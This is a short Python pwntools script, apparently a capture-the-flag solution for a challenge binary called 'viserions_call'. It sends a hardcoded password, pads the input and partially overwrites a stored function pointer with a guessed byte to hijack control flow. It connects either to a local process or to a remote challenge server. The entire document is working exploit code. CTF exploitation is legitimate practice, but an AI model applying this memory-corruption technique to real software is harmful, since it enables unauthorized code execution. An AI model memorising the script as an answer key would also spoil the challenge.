from pwn import *
import sys

elf = ELF('./viserions_call')
context.update(binary=elf)

# name -> rbp-336
# random -> rbp-288
# function -> rbp-296
# buffer -> rbp-316

if args.REMOTE:
	p = remote('gc1.eng.run', 30032)
else:
	p = elf.process()

p.recvlines(2)
p.sendline(b'JUNK')
p.recvline()

upper_nibble = 0

payload = b's3cur3_p4ssw0rd'
payload += b'A' * (20 - len(payload))
payload += b'\xdf' + bytes([upper_nibble * 16 + 5])

p.send(payload)
p.recvline()

print(p.recvall().strip().decode())

p.close()